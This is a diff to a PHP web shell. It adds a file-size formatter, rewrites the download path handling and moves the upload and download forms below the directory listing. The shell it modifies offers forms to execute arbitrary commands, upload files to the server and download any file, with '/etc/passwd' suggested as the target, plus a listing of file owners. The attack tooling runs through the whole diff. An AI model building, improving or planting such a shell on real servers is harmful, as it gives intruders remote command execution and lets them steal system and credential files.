@@ -31,6 +31,14 @@ if ($use_auth)
 	}
 }
 
+function format_size($b)
+{
+	if ($b >= 1024 * 1024 * 1024) { return number_format((float) $b / (1024 * 1024 * 1024), 2, '.', '') . " GB"; }
+	if ($b >= 1024 * 1024) { return number_format((float) $b / (1024 * 1024), 2, '.', '') . " MB"; }
+	if ($b >= 1024) { return number_format((float) $b / (1024), 2, '.', '') . " KB"; }
+	return strval($b) . " B";
+}
+
 function show_alert($msg)
 {
 	echo( sprintf("<script>alert('%s');</script>", $msg) );
@@ -38,8 +46,6 @@ function show_alert($msg)
 
 if (isset($_FILES["upload"]))
 {
-	$file = $_FILES["upload"];
-
 	$target_directory = getcwd();
 	$target_file = $target_directory . "/" . basename($_FILES["upload"]["name"]);
 	$result_u = null;
@@ -63,22 +69,22 @@ if (isset($_FILES["upload"]))
 
 if (isset($_POST["download"]))
 {
-	$file = $_POST["download"];
-
+	$target_directory = getcwd();
+	$target_file = $target_directory . "/" . $_POST["download"];
 	$result_d = null;
 
-	if (file_exists($file))
+	if (file_exists($target_file))
 	{
-		if (is_readable($file))
+		if (is_readable($target_file))
 		{
-			header("Content-Length:" . filesize($file) . "");
+			header("Content-Length:" . filesize($target_file) . "");
 			header("Content-Description: File Transfer");
 			header("Content-Type: application/octet-stream");
-			header('Content-Disposition: attachment; filename="' . $file . '"');
+			header('Content-Disposition: attachment; filename="' . $target_file . '"');
 		
 			flush();
 
-			readfile($file);
+			readfile($target_file);
 
 			exit();
 		}
@@ -228,24 +234,6 @@ echo( sprintf("
 );
 ?>
 
-<form action="<? echo($shell); ?>" method="POST" enctype="multipart/form-data">
-	<label for="upload">File:</label>
-	<input type="file" id="upload" name="upload">
-	<input type="submit" value="Upload">
-	<b>Info:</b> file will be uploaded to current working directory.
-</form>
-
-<?php if (isset($result_u)) { show_alert($result_u); } ?>
-
-<form action="<? echo($shell); ?>" method="POST">
-	<label for="download">File:</label>
-	<input type="text" id="download" name="download" placeholder="/etc/passwd">
-	<input type="submit" value="Download">
-	<b>Info:</b> enter full file path.
-</form>
-
-<?php if (isset($result_d)) { show_alert($result_d); } ?>
-
 <form action="<? echo($shell); ?>" method="POST">
 	<label for="exec">Command:</label>
 	<input type="text" id="exec" name="exec" placeholder="ls -ls">
@@ -347,7 +335,7 @@ if ($cwd)
 
 			echo( sprintf("<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s / %s</td><td>%s</td></tr>",
 				$f,
-				is_file($f) ? filesize($f) : "dir", 
+				is_file($f) ? format_size(filesize($f)) : "dir", 
 				date(DATE_RFC2822, filectime($f)),
 				date(DATE_RFC2822, filemtime($f)),
 				sprintf("%s ( %s )", posix_getuid(), posix_getpwuid(fileowner($f))["name"]),
@@ -361,6 +349,22 @@ if ($cwd)
 	<?php
 }
 ?>
+
+<form action="<? echo($shell); ?>" method="POST" enctype="multipart/form-data">
+	<label for="upload">File:</label>
+	<input type="file" id="upload" name="upload">
+	<input type="submit" value="Upload">
+</form>
+
+<?php if (isset($result_u)) { show_alert($result_u); } ?>
+
+<form action="<? echo($shell); ?>" method="POST">
+	<label for="download">File:</label>
+	<input type="text" id="download" name="download" placeholder="/etc/passwd">
+	<input type="submit" value="Download">
+</form>
+
+<?php if (isset($result_d)) { show_alert($result_d); } ?>
 
 <form action="<? echo($shell); ?>" method="POST">
 	<label for="dir">Folder:</label>
